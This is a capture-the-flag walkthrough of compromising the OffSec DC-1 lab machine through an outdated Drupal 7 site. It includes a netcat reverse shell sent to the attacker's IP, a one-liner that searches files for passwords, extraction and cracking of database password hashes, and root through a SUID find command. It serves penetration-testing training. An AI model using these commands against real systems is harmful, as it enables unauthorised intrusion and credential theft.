# DC-1 Box

- If you want to identify machines up on a network, you can use the following command to see what hosts are up, and their IP addresses within a certain subnet`sudo nmap -sn 192.168.133.1/24`. 

- We do `1/24` to search for all hosts up within the range of 1-255.
- `sudo nmap -sC -sV -oN nmap -v -p- 192.168.108.193`

- We are performing a common Nmap scan to enumerate possible vulnerabilities and service version scan on the kali box 'DC-1'.

- `-sC` specifies scanning for common vulnerabilities within services.

- `-sV` specifies scanning for versions of services

- The scan details will be outputted to a text file called 'Nmap' as specified by the `-oN` switch.

- The `p-` switch will specify to scan ALL ports on the targeted IP address.

- Ports open: 20, 80, 111, 37701

- Service Info:
 `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

This tells us the OS is Linux.
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410124837.png)

The scan also tells us the machine running is Debian, as per the VERSION field of the scan.


```bash PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37701/tcp   status
|   100024  1          39759/udp6  status
|   100024  1          45295/tcp6  status
|_  100024  1          55275/udp   status
37701/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.70 seconds
           Raw packets sent: 65705 (2.891MB) | Rcvd: 65585 (2.623MB)
```

Here's the entire nmap scan.


Next, we are going to type the IP address of the box we are pentesting in the firefox search box. 

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410125256.png)
We find this site. Drupal, a CMS (content management site) which is used for website management.

Looks like the version we are running is older than some of the newer ones (we tell this by looking at the format of the website compared to the new google search of the site).
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410125539.png)
(Newest version)
- Let's lookup 'pentesting drupal' to see if there is common vulnerabilities against it.

We come across a hacktricks page:


![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410125411.png)
## Droopescan
Nothing really here, lets look at another resource, that has tools to pentest drupal.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410125702.png)

- We have a github link to this tool, which we can try installing using `sudo apt`  or `git clone`.

the manual installation of this tool which the github tells us to do with this:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410130353.png)

Paste this into our terminal, and it should be installed.

- This created a directory 'droopescan' which contains all the tool functionalites.

`./droopescan` to run the tool. We use `./` to specify when we want to run an executable (a process, tool, script).

Lets first run the help command of this tool to see how we can use it:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410130559.png)

We are looking to exploit Drupal: 

The example syntax of a command to run against Drupal is given here:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410130647.png)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410130721.png)

With the above command, we will start a scan against the machine we are looking to exploit, which is the Drupal website at 192.168.108.193 (for me).


## Drupwn
NOTE: In a real pentesting scenario, we would not wait for this tool to run, we would be doing stuff in the background so that we waste no time.

For example: we could use Tmux (or ctrl+shift+t) to create another tab, and then look to run another tool we found on the Pentest Book website:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410131012.png)

(This one)

- Im now gonna create another tab in the terminal (ctrl+shift+t) and then go back into the directory for the box i created earlier (/OffSec/DC-1)

- Now we are going to run another tool, drupwn. First, we go to the github link provided, and try to figure out how to install the tool:

First, `git clone https://github.com/immunIT/drupwn`

This will create a directory 'drupwn' that we then cd into.

Which will give us a file 'requirements.txt' that has pip modules in it we can install:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410131535.png)

We will run this command to install the tool.


Then lets run the help command of the tool to find out how to use it:
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410131810.png)

The full command we wanna run with all the arguments is 

`python3 drupwn --mode enum --target http://192.168.108.193/

This will start running the drupwn tool. Lets go back to the droopescan tool which has finished by now.

## Droopescan

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132012.png)

We can see the scan has now finished with this tool.

- Looks like we found an interesting URL where a default admin could login:

- Additionally, the scan tells us some versions that the drupal site could be.

- Also tells us plugins that could be exploitable.


- Now, lets go to exploitdb and search for 'drupal7'
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132223.png)
   - Look for entires that have a checkmark next to them

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132245.png)

This looks like the most promising exploit (works for versions under 7.58, and verified by checkmark)

- On kali linux we can use this tool called 'searchsploit' which pretty much does the same thing as exploitdb, because it gets all its exploits from exploitdb.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132415.png)


Out of this list, we can see the same exploit we are looking at on exploitdb 

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132542.png)

Can continue using searchsploit to do sift through details on exploitdb on this vulnerability within the terminal 
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132636.png)

- This will print out details that we can match to the exploitdb entry.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410132725.png)

Now lets run the same command with the `-m` switch to copy the exploit to the directory we are within right now.

- lets move it to the previous directory.

`mv 44449.rb ..` 

Now, lets run the created `44449.rb` exploit using the proper compiler for it, which we know is Ruby.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410133656.png)

- We get an error, which we can input into goolge to find a possible solution.

- Someone tells us that the error  can be solved by running `sudo gem install highline`

So lets try that:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410133848.png)

- Hey look, now the exploit worked when we run it with `ruby 44449.rb` 

This tells us to run the following command like `ruby nameofexploit.rb <websiteaddress>`


![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410134106.png)

This worked, and it looks like this opened a shell:
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410134156.png)
we have successfully got a shell that is a fake php shell. 

Lets try to get a real shell now, using netcat.

But first, we need to know if netcat is on the box, so type `which netcat` within the shell.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410134347.png)

So netcat is on the server, and we have our fake php shell on this server. Lets use netcat to create a bash shell on this server, so we can really elevate our privileges.

**Reverse shell** 
`nc -e /bin/bash 192.168.49.108 22`

`-e` says that we want to send an application

`/bin/bash` is specifies we want to send a terminal 

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410134912.png)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410134923.png)

So, after establishing a netcat listener on our virtual machine and connecting to that listener by sending a reverse bash shell to ourselves from the exploited machine, we can now interact with the exploited machine from the listener. 

After typing  `whoami` we can see we get a response back 'www-data' which means we are successfully receiving a connection from the exploited DC-1 box.

We have a shell, and can now cd in and out of directories, but its hard to interpret whats going on and read stuff.

So lets make this prettier with a python one-line script that creates a more readable shell.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410135322.png)

So, using `python -c "import pty;pty.spawn('/bin/bash');"`

we can create a more readable shell, which actually shows us the user that we are logged in as (www-data) on the exploited machine (DC-1).

- Because this is a CMS, and we have logins, our methodology should include looking for configuration files which might contain credentials that we can use to login to connected services.

- Run a bash one-liner to look for these important files:
`for i in $(find . -type f 2>dev/null);do cat $i | grep -i pass && echo $i; done
`

- So this one-liner pipes anything and everything that we read in files and and looks specifically for the phrase 'pass', so that we can look for instances of passwords.

- Running this one-liner will take a while as it searches every file on the current directory.

We didn't really find anything from the massive wall of text this printed out, so instead we looked up what the default configuration file of drupal is, which google tells us is 'settings.php'

First we have to navigate to where this file is located, then cat it out.
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410140550.png)
- Now, we are gonna look for 'username' and 'password' within this php file.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410140635.png)

We find some interesting details here, which are database credentials (probably for mySQL). 


Lets just check to see what services are running on t his machine, and if we can find a mySQL database running (would look for port 3306)
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410140805.png)

- Using `netstat -tulpn` we can see that there is indeed a database running on this machine.

- How would we connect to it? 

`mysql -u dbuser -p`

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410141024.png)

We got into the sql database. Now lets start showing databases.

`SHOW DATABASES;`

`USE drupaldb;` 

`SHOW TABLES;`

After getting all the tables in this database, we are looking specifically for a 'users' table. We find this one, and type `DESC users` to print out the layout of the table.

After knowing the layout, we are interesting in selecting the name and password fields from this table. 

So we type the sql query `SELECT name,pass FROM users;`

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410141723.png)

Look at that. We now have usernames and passwords for some users, but they look encrypted.

What should we do then?

Lets run a common password list on these hashed passwords:

- First put the hashed passwords into a file.

- gunzip the rockyou.txt wordlist that comes with kali.

- run JohnTheRipper on the created 'hash' file to run a password list attack on it.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410142317.png)

This will take a while, so lets move something in the background.

Lets move back to our mysql shell, and exit it.


![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410142424.png)

Moving to the home directory, we see a text file local.txt which contains the flag which we need to give to OffSec to complete the challenge.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410142557.png)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410142635.png)

We catted the local.txt file and got the flag, then submitted that to the DC-1 challenge on OffSec.


- Now we download linpeas.sh to our machine via linpeas on github -> PEASS-ng -> releases -> linpeas.sh

- The RELEASES section of github is used whenever something needs to be compiled, and they will put it in releases pre-compiled so you dont have to.


Lets copy linpeas.sh from our downloads directory to our current directory: (a temporary /dev/shm directory)

`cp ~/Downloads/linpeas.sh .`

- Now we are going to setup a temporary python http server using `python3 -m http.server 80` (on our kali machine)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410143529.png)

So we can see our temporary server running there on the right.

- We can now use `wget 192.168.49.108/linpeas.sh`

- To get the hosted linpeas.sh file from the temporary web server, onto the exploited box.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410144458.png)

- Now we have downloaded the linpeas.sh file from the temp python server on our host machine, onto the exploited box.

- We can then run linpeas.sh with `bash linpeas.sh`

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410144619.png)

- Found version numbers of the Linux exploited linux box (which is 3.2 and vulnerable).

- Next we see lots of exploits that have the potential to be ran against this machine.

- The important  exploit suggestor is this:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410144942.png)

- Next we see lots of processes running on the machine.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410145020.png)

- Next we have the .socket stuff, which is exploitable if we can reboot the computer, but we cant because we are www-data and have no root privileges.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410145200.png)

- Next, the linpeas script runs port scanning stuff and prints out the details.

- Next we see User Information:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410145324.png)

Heres the interesting part:

we see user 'flag4' with a uid of over 1000 they are an actual user. 

- Next there is some software infomration, which we  see there is gcc and python on the machine, which can be used as compilers.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410145604.png)

- Nothing much is important until we stumble upon the drupal settings.php file again:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410145650.png)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410145813.png)

Now we see something that /find that is almost certainly exploitable.

- Lets go to GTFOBins and search under find:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410150025.png)

We have the first part (SUID bit on find)
We want the second part, so run:

`./find . -exec /bin/sh -p \; -quit`

BUT, because we are following this exploit, we need to omit the -p to allow the default `sh` shell to run with SUID privileges.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410150326.png)

After running this, we have root.

The command above does - for everything it finds in the current directory, it executes /bin/sh and then eventually quits.

- Abuses sh as opposed to bash .

Next lets run `bash -p -i` so we can have an interactive bash session with the machine (kinda like how we upgraded our shell with python, given we have an sh session).

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220410150836.png)

- Doing these commands, we can eventually navigate to where the last flag would be, which is in the /root folder, which only root users have access to.

- We then cat out the proof.txt file to get the last flag.

So, the flags we got were in local.txt, and proof.txt.
